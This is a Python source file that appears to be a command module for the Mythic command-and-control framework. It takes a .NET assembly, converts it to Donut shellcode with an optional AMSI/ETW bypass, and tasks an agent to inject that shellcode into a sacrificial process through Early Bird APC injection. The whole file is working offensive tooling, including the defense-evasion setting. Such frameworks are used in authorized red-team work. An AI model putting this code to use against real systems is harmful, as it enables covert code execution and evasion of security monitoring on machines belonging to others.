import os
import tempfile

import donut

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly",
                cli_name="Assembly",
                display_name="Assembly (.NET .exe/.dll)",
                type=ParameterType.File,
                description=".NET assembly to execute in the sacrifice process.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=0)],
            ),
            CommandParameter(
                name="arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                default_value="",
                description="Command-line arguments passed to the assembly (embedded in Donut shellcode).",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="timeout_s",
                cli_name="TimeoutSeconds",
                display_name="Timeout (seconds)",
                type=ParameterType.Number,
                default_value=30,
                description="Maximum time to wait for the assembly to complete before returning.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="push_mode",
                cli_name="PushMode",
                display_name="Push Mode",
                type=ParameterType.Boolean,
                default_value=False,
                description="Send shellcode in a single chunk instead of pulling in chunks.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="chunk_size_mb",
                cli_name="ChunkSizeMB",
                display_name="Chunk Size (MB)",
                type=ParameterType.Number,
                default_value=4,
                description="Shellcode download chunk size in MB (pull mode only).",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="amsi_bypass",
                cli_name="AmsiBypass",
                display_name="AMSI/ETW Bypass",
                type=ParameterType.ChooseOne,
                choices=["donut", "none"],
                default_value="donut",
                description=(
                    "Bypass technique applied in the sacrifice process before CLR load. "
                    "'donut': Donut patches AmsiScanBuffer + EtwEventWrite (classic, may be flagged). "
                    "'none': no patch, AMSI active in the sacrifice process."
                ),
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly (modal popup)"
    description = (
        "Convert a .NET assembly to Donut PIC shellcode and inject it into the spawnto process "
        "via Early Bird APC. Captures stdout/stderr and returns the output. "
        "BlockDLLs policy applied if enabled via blockdlls command."
    )
    version = 1
    author = "@goultarde"
    attackmapping = ["T1055", "T1055.004", "T1059.001"]
    argument_class = ExecuteAssemblyArguments
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        assembly_file_id = taskData.args.get_arg("assembly")
        arguments        = taskData.args.get_arg("arguments") or ""
        timeout_s        = int(taskData.args.get_arg("timeout_s") or 30)
        push_mode        = taskData.args.get_arg("push_mode") or False
        chunk_size_mb    = int(taskData.args.get_arg("chunk_size_mb") or 4)
        amsi_bypass      = taskData.args.get_arg("amsi_bypass") or "donut"

        # Donut bypass param: 1=none, 3=try AMSI/ETW patch (continue on fail)
        donut_bypass = 3 if amsi_bypass == "donut" else 1

        # Retrieve assembly bytes
        file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=assembly_file_id,
        ))
        if not file_resp.Success:
            raise Exception(f"Failed to retrieve assembly: {file_resp.Error}")

        assembly_bytes = file_resp.Content

        # Get assembly filename for display
        file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            AgentFileID=assembly_file_id,
        ))
        assembly_name = "assembly"
        if file_search.Success and file_search.Files:
            assembly_name = file_search.Files[0].Filename or assembly_name

        # Convert to Donut shellcode (PIC x64, console output redirected)
        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as tmp:
            tmp.write(assembly_bytes)
            tmp_path = tmp.name

        try:
            donut_kwargs = dict(
                file=tmp_path,
                arch=2,           # x64
                bypass=donut_bypass,
                format=1,         # raw shellcode
            )
            if arguments:
                donut_kwargs["params"] = arguments

            sc_bytes = donut.create(**donut_kwargs)
        finally:
            os.unlink(tmp_path)

        # Store shellcode in Mythic
        sc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=taskData.Task.ID,
            FileContents=sc_bytes,
            DeleteAfterFetch=True,
        ))
        if not sc_resp.Success:
            raise Exception(f"Failed to store shellcode: {sc_resp.Error}")

        file_id = sc_resp.AgentFileId

        # MD5 for integrity check
        import hashlib
        md5 = hashlib.md5(sc_bytes).hexdigest()

        taskData.args.add_arg("file",          file_id,                 ParameterType.String)
        taskData.args.add_arg("shellcode_md5", md5,                     ParameterType.String)
        taskData.args.add_arg("timeout_ms",    timeout_s * 1000,        ParameterType.Number)

        if push_mode:
            taskData.args.add_arg("sc_chunk_size", len(sc_bytes), ParameterType.Number)
        else:
            taskData.args.add_arg("sc_chunk_size", chunk_size_mb * 1024 * 1024, ParameterType.Number)

        taskData.args.remove_arg("assembly")
        taskData.args.remove_arg("arguments")
        taskData.args.remove_arg("timeout_s")
        taskData.args.remove_arg("push_mode")
        taskData.args.remove_arg("chunk_size_mb")
        taskData.args.remove_arg("amsi_bypass")

        display = assembly_name
        if arguments:
            display += f" {arguments}"
        display += f" | timeout={timeout_s}s | bypass={amsi_bypass} | md5={md5}"
        display += " | push" if push_mode else " | pull"
        response.DisplayParams = display

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
